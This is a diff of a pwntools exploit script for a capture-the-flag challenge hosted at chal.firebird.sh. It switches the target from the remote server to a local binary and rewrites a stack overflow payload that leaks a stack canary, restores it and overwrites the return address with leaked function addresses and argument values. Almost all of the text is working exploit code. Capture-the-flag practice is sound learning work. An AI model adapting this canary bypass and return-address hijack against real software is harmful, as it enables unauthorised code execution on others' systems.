@@ -5,11 +5,11 @@ import os
  # If you're using tmux
 # context.terminal = ['gnome-terminal', '--'] # If you're using gnome-terminal
 
-#p = process("./program")
-p = remote("chal.firebird.sh", 35020)
+p = process("./program")
+#p = remote("chal.firebird.sh", 35020)
 
-#print(f"[*] Python script PID: {os.getpid()}")
-#print(f"[*] Binary PID: {p.pid}")
+print(f"[*] Python script PID: {os.getpid()}")
+print(f"[*] Binary PID: {p.pid}")
 
 p.recvuntil(b"you are in ")
 UwU_main_addr = int(p.recvuntil(b" ").strip(), 16)
@@ -46,17 +46,16 @@ p.sendline(canary_location)
 p.recvuntil(b"contains ")
 leaked_canary = int(p.recvuntil(b"\n").strip(), 16)
 print("[*] leaked canary:", hex(leaked_canary))
-payload = b'UwUUwU'
-payload += cyclic(40) # 88 bytes to get canary
-payload += b'deadbeef'
-payload += cyclic(34)
+payload = b'UwUUwU'+ b'A' * 82 # 88 bytes to get to canary
 payload += p64(leaked_canary) # replace with variable that stores it
 payload += b'A' * 8 # goes to return address 
 payload += p64(know_more_addr)
 payload += p64(UwU_flag_addr)
-payload += b'B' * 16 # padding between deadbeef and rbp 
+payload += b'1' * 8 # padding between deadbeef and rbp 
+payload += b'2' * 8 # padding between deadbeef and rbp 
 payload += p64(0xdeadbeef)
-payload += b'B' * 16 # padding between deadbeef and beefdead  
+payload += b'3' * 8 # padding between deadbeef and beefdead  
+payload += b'4' * 8 # padding between deadbeef and beefdead  
 payload += p64(0xbeefdead)
 
 
